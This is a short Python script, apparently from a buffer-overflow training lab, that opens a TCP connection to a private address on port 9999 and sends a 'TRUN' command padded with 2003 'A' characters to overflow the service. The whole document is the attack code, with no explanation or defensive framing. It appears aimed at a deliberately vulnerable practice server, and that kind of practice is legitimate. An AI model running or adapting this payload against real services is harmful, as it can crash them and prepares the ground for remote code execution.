### Socket Buffer Overflow Script
```
#!/usr/bin/env python
import socket

buffer = "TRUN /.:/"
buffer += "A" * 2003
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.38.121", 9999))
print(s.recv(1024))
s.send(buffer)
print s.recv(1024)
s.close()
```
